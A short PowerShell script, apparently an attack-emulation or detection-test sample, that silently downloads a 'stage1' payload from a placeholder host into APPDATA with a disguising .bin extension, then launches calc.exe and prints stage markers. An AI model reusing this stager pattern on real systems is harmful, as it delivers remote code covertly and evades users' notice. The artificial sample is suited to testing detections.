
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://contoso.com/stage1.ps1",
    [string]$LocalPath = "$env:APPDATA\stage1.bin",
    [int]$RequestTimeout = 238
)
try { Start-BitsTransfer -Source $PayloadUrl -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Output "stage 3 initialized"; Write-Verbose "stage marker 40 reached" } catch { Write-Warning "Stage transfer failed" }
